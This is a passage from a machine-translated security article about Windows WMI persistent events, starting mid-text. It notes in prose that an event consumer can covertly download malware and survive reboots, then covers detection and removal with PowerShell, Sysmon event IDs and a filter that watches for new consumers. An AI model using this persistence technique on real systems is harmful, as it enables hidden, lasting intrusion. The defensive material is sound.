In the course of my own tests, I was able to get a permanent event to work on the target system without undue effort and suffering. </font><font style="vertical-align: inherit;">As you recall, this was very difficult to achieve with temporary WMI events that last just as long as a PowerShell session.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
By setting up a persistent WMI event, for example, to monitor the users' login, an insider or hacker is not required to remain in the target system. An added bonus is that a persistent WMI event is robust: when the computer restarts, event triggers still work. This makes WMI persistent events a powerful and covert way to trigger an attack, which can involve much more than just monitoring. As you recall, WMI events are far from the first place where security specialists will look for the source of the attack. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
For example, PowerShell code for an event consumer can act as a launcher and download malware stored on a remote server using </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Great </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">presentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber at the Black Hat conference contains a lot of information about the malicious potential of persistent WMI events. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
If you are a security specialist, how will you work with WMI events in terms of their potential malicious use? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Good luck on your side: using the Get-WmiObject cmdlet (alias gwmi), you can create a list of event filters, consumers, and binding objects:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 You list WMI persistent events using Get-WMIObject and set the appropriate parameters. </font><font style="vertical-align: inherit;">Note the lack of a timestamp. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now, if they find the filter (or consumer) of a permanent event suspicious, IT professionals can turn it off by removing it using the PowerShell pipeline and the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI-RemoveObject cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Removing persistent WMI events involves using the PowerShell pipeline. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Note that neither the time the event was generated nor the name of the malicious user is specified here. </font><font style="vertical-align: inherit;">To obtain this forensic information, you will need to consult the Windows event logs. </font><font style="vertical-align: inherit;">More on this below.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Can I disable persistent WMI events?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
At the very least, IT professionals can quickly see recorded WMI persistent events and start analyzing real-life scenarios for signs of threats. Perhaps, as an experienced IT security specialist, you think that not everyone needs WMI on laptops and the best strategy for dealing with WMI persistent event vulnerabilities is to completely disable WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You can try disabling the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> service </font><font style="vertical-align: inherit;">, which starts WMI. In practice, this is not so simple. In the course of my own tests, I was not able to disable this service: it automatically started again and again. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Suppose you still managed to disable it. Windows administrative software is heavily dependent on WMI and will not work if Winmgmt is unavailable. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">Forums</font></a><font style="vertical-align: inherit;"> all over the internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">filled with messages warning against disabling WMI. </font><font style="vertical-align: inherit;">I advise you to listen to and have mercy on your WMI.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identify threat WMI events with Sysmon and SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In general, you will have to accept the WMI event vulnerability as a fact. Fortunately, there are more efficient ways to detect persistent events and other suspicious event operations on Windows than using the aforementioned Powershell cmdlet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Meet Sysmon! I will not go into details about this free Windows utility, which can be downloaded </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> in this article. I can only say that it allows you to get very useful information for analysis in one place, instead of viewing each Windows event log individually. Windows 7 and later users might not need Sysmon, as newer Windows systems use more advanced standard logging mechanisms.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon is a convenient and intuitive event logging tool from Microsoft. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon assigns event identifier 19 to the creation of a permanent WMI filter event (20 is assigned to create a WMI consumer event, and 21 is assigned to WMI binding). If you open the event viewer, you will find the Sysmon event log in the Microsoft -&gt; Windows -&gt; Sysmon section. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You do not want to open the event viewer manually to monitor persistent WMI events, which may be a sign of hacker activity. We know how to help you. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Why not create a WMI persistent event filter to monitor the creation (guessed?) Of a WMI persistent event? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
On </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">There is a small project where you will find code to configure this operation. </font><font style="vertical-align: inherit;">Here is a code snippet for a WMI event filter that allows you to track the creation of ... yes, a WMI event filter:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obviously, here we will need the help of information security and security events management (SIEM) tools, because the evidence is buried in the rubble of magazines. </font><font style="vertical-align: inherit;">I think you understand where everything is going. </font><font style="vertical-align: inherit;">You will need a </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">security monitoring solution</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> that combines SIEM features with analysis of other threats to detect and eliminate threats associated with ongoing WMI events.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentation Frequently Asked Questions</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The methods described above may well be used to implement a surveillance system on your network, however, you might have some questions about WMI. </font><font style="vertical-align: inherit;">In this section, we will answer the most common ones.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Is WMI deprecated?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI itself is not outdated, but WMIC has been deprecated, which is confusing to many people. </font><font style="vertical-align: inherit;">PowerShell is now used to access the functions previously provided by WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">What ports does WMI use? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI uses TCP port 135 and a number of dynamic ports: 49152-65535 (dynamic RPC ports: Windows Vista, 2008 and higher), TCP 1024-65535 (dynamic RPC ports: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">You can also configure a custom port range for WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Does WMI use WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This configuration is not standard, but you can use WMI to retrieve data using scripts or applications using the WinRM Scripting API, or using the Winrm command-line tool. </font><font style="vertical-align: inherit;">WinRM can use WMI to collect resource data or to manage resources in the Windows operating system.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conclusion</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As we saw, WMI provides administrators with a powerful tool for monitoring remote processes and computers and can be used in developing end-user monitoring agreements (EUMAs) to automatically alert suspicious activity. </font><font style="vertical-align: inherit;">This makes it a great tool for detecting and eliminating internal threats, preventing attempts to circumvent security policies, as well as monitoring how your systems are used. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
If you want to learn more about how to use WMI to monitor insider activity, you can download our detailed guide </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en507048/index.html">Olya, tests and factory - the path to beautiful architecture and clean code</a></li>
<li><a href="../en507050/index.html">Analysis of the Hollow Knight game design. Part 1. Forgotten Crossroads</a></li>
<li><a href="../en507052/index.html">The coolest Data Scientist does not waste time on statistics</a></li>
<li><a href="../en507058/index.html">Joel Spolsky: Gamification Role in Stack Overflow Success</a></li>
<li><a href="../en507066/index.html">10 Ways to Automate Ads on Google Ads</a></li>
<li><a href="../en507074/index.html">Cheat sheet for SIMD instructions, now for .NET Core</a></li>
<li><a href="../en507078/index.html">The court ordered the media to remove someone else's article, and publish a refutation on the main Yandex</a></li>
<li><a href="../en507080/index.html">All Cups: The Story of a Great Ecosystem Design</a></li>
<li><a href="../en507084/index.html">SpatialChat parties became popular during the pandemic - and they are unlikely to end after cove</a></li>
<li><a href="../en507086/index.html">Convert Bash script to C # code to send SMS via usb modem HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>